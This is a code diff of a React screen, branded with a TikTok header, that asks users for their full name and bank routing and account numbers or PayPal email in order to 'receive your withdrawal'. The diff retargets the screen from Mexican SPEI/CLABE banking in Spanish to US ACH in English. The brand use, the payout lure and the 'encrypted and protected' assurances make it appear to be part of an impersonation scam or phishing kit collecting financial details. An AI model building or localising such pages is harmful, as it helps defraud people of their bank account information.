@@ -11,28 +11,24 @@ interface BankDetailsScreenProps {
 
 const WITHDRAWAL_METHODS = [
   {
-    id: "spei",
-    label: "Transferencia SPEI",
-    subtitle: "Transferencia bancaria inmediata",
+    id: "bank",
+    label: "Bank transfer (ACH)",
+    subtitle: "1-3 business days",
     icon: Building2,
   },
   {
     id: "paypal",
     label: "PayPal",
-    subtitle: "Envío a tu email de PayPal",
+    subtitle: "Sent to your PayPal email",
     icon: Wallet,
   },
 ];
 
-const MX_BANKS = [
-  "BBVA", "Santander", "Banamex", "Banorte", "HSBC",
-  "Scotiabank", "Inbursa", "Azteca", "Nu México", "Mercado Pago",
-];
-
 const FIELD_LABELS: Record<string, string> = {
-  clabe: "CLABE interbancaria",
-  name: "Nombre completo",
-  email: "Email de PayPal",
+  routing: "Routing number",
+  account: "Account number",
+  name: "Full name",
+  email: "PayPal email",
 };
 
 type Step = "method" | "form" | "confirm";
@@ -48,10 +44,11 @@ const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
     setDetails((prev) => ({ ...prev, [key]: value }));
 
   const isFormValid = () => {
-    if (selectedMethod === "spei") {
+    if (selectedMethod === "bank") {
       return (
         (details.name?.trim().length ?? 0) > 2 &&
-        (details.clabe?.length ?? 0) === 18
+        (details.routing?.length ?? 0) === 9 &&
+        (details.account?.length ?? 0) >= 6
       );
     }
     if (selectedMethod === "paypal") {
@@ -62,23 +59,22 @@ const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
 
   const handleConfirm = () => onSubmit(selectedMethod, details);
 
-  // --- METHOD SELECTION ---
   if (step === "method") {
     return (
       <div className="min-h-screen flex flex-col bg-background">
         <TikTokHeader showHelp />
         <div className="flex-1 px-6 py-6">
           <p className="text-sm text-muted-foreground mb-1">
-            Bienvenido/a de nuevo, <strong className="text-foreground">{userName}!</strong>
+            Welcome back, <strong className="text-foreground">{userName}!</strong>
           </p>
           <div className="mt-4 mb-2 flex items-center justify-between">
-            <h2 className="text-xl font-semibold">Agregar método de retiro</h2>
+            <h2 className="text-xl font-semibold">Add withdrawal method</h2>
             <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-              Paso 3 de 4
+              Step 3 of 4
             </span>
           </div>
           <p className="text-sm text-muted-foreground mb-5">
-            Elige cómo quieres recibir tus fondos.
+            Choose how you want to receive your funds.
           </p>
 
           <div className="rounded-2xl border border-border bg-card overflow-hidden">
@@ -109,7 +105,6 @@ const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
     );
   }
 
-  // --- CONFIRMATION ---
   if (step === "confirm") {
     const entries = Object.entries(details).filter(([, v]) => v);
     return (
@@ -117,18 +112,18 @@ const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
         <TikTokHeader showHelp />
         <div className="flex-1 px-6 py-6">
           <div className="mt-4 mb-2 flex items-center justify-between">
-            <h2 className="text-xl font-semibold">Confirma tus datos</h2>
+            <h2 className="text-xl font-semibold">Confirm your details</h2>
             <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-              Paso 3 de 4
+              Step 3 of 4
             </span>
           </div>
           <p className="text-sm text-muted-foreground mb-6">
-            Revisa tu información de {method?.label} antes de enviar.
+            Review your {method?.label} information before submitting.
           </p>
 
           <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
             <div>
-              <p className="text-xs text-muted-foreground">Método</p>
+              <p className="text-xs text-muted-foreground">Method</p>
               <p className="text-sm font-medium">{method?.label}</p>
             </div>
             {entries.map(([key, value]) => (
@@ -137,7 +132,7 @@ const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
                 <div className="pt-4">
                   <p className="text-xs text-muted-foreground">{FIELD_LABELS[key] ?? key}</p>
                   <p className="text-sm font-medium">
-                    {key === "clabe"
+                    {key === "account"
                       ? value.slice(0, -4).replace(/./g, "•") + value.slice(-4)
                       : value}
                   </p>
@@ -149,82 +144,86 @@ const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
           <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
             <ShieldCheck className="w-4 h-4 text-success shrink-0" />
             <p className="text-xs text-muted-foreground">
-              Tus datos están <strong className="text-foreground">cifrados</strong> y protegidos.
+              Your data is <strong className="text-foreground">encrypted</strong> and protected.
             </p>
           </div>
 
           <Button onClick={handleConfirm} className="w-full h-14 rounded-full text-base font-semibold mt-8">
-            Confirmar y continuar
+            Confirm and continue
           </Button>
           <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
-            ← Volver y editar
+            ← Back and edit
           </Button>
         </div>
       </div>
     );
   }
 
-  // --- FORM (per method) ---
   return (
     <div className="min-h-screen flex flex-col bg-background">
       <TikTokHeader showHelp />
       <div className="flex-1 px-6 py-6">
         <div className="mt-4 mb-2 flex items-center justify-between">
-          <h2 className="text-xl font-semibold">Datos de {method?.label}</h2>
+          <h2 className="text-xl font-semibold">{method?.label} details</h2>
           <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-            Paso 3 de 4
+            Step 3 of 4
           </span>
         </div>
         <p className="text-sm text-muted-foreground mb-4">
-          Ingresa tu información de {method?.label} para recibir tu retiro.
+          Enter your {method?.label} information to receive your withdrawal.
         </p>
 
         <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
           <ShieldCheck className="w-4 h-4 text-success shrink-0" />
           <p className="text-xs text-muted-foreground">
-            Tus datos están <strong className="text-foreground">cifrados</strong> y almacenados de forma segura.
+            Your data is <strong className="text-foreground">encrypted</strong> and securely stored.
           </p>
         </div>
 
         <div className="space-y-4">
-          {selectedMethod === "spei" && (
+          {selectedMethod === "bank" && (
             <>
               <div>
-                <label className="text-sm font-medium mb-1.5 block">Nombre completo</label>
+                <label className="text-sm font-medium mb-1.5 block">Full name</label>
                 <Input
                   type="text"
-                  placeholder="Tu nombre completo"
+                  placeholder="Your full name"
                   value={details.name || ""}
                   onChange={(e) => updateDetail("name", e.target.value)}
                   className="h-12 rounded-xl"
                 />
               </div>
               <div>
-                <label className="text-sm font-medium mb-1.5 block">CLABE interbancaria</label>
+                <label className="text-sm font-medium mb-1.5 block">Routing number</label>
                 <Input
                   type="text"
                   inputMode="numeric"
-                  maxLength={18}
-                  placeholder="18 dígitos"
-                  value={details.clabe || ""}
-                  onChange={(e) => updateDetail("clabe", e.target.value.replace(/\D/g, ""))}
+                  maxLength={9}
+                  placeholder="9 digits"
+                  value={details.routing || ""}
+                  onChange={(e) => updateDetail("routing", e.target.value.replace(/\D/g, ""))}
                   className="h-12 rounded-xl"
                 />
-                {(details.clabe?.length ?? 0) > 0 && (details.clabe?.length ?? 0) < 18 && (
-                  <p className="text-xs text-destructive mt-1">La CLABE debe tener exactamente 18 dígitos</p>
-                )}
               </div>
-              <p className="text-xs text-muted-foreground">
-                Bancos compatibles: {MX_BANKS.join(", ")}.
-              </p>
+              <div>
+                <label className="text-sm font-medium mb-1.5 block">Account number</label>
+                <Input
+                  type="text"
+                  inputMode="numeric"
+                  placeholder="Account number"
+                  value={details.account || ""}
+                  onChange={(e) => updateDetail("account", e.target.value.replace(/\D/g, ""))}
+                  className="h-12 rounded-xl"
+                />
+              </div>
             </>
           )}
 
           {selectedMethod === "paypal" && (
             <div>
-              <label className="text-sm font-medium mb-1.5 block">Email de PayPal</label>
+              <label className="text-sm font-medium mb-1.5 block">PayPal email</label>
               <Input
-                type="email" placeholder="tu@ejemplo.com"
+                type="email" placeholder="you@example.com"
                 value={details.email || ""}
                 onChange={(e) => updateDetail("email", e.target.value)}
                 className="h-12 rounded-xl"
@@ -238,10 +237,10 @@ const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
           disabled={!isFormValid()}
           className="w-full h-14 rounded-full text-base font-semibold mt-8"
         >
-          Continuar
+          Continue
         </Button>
         <Button variant="ghost" onClick={() => { setStep("method"); setDetails({}); }} className="w-full mt-3 text-sm text-muted-foreground">
-          ← Cambiar método
+          ← Change method
         </Button>
       </div>
     </div>
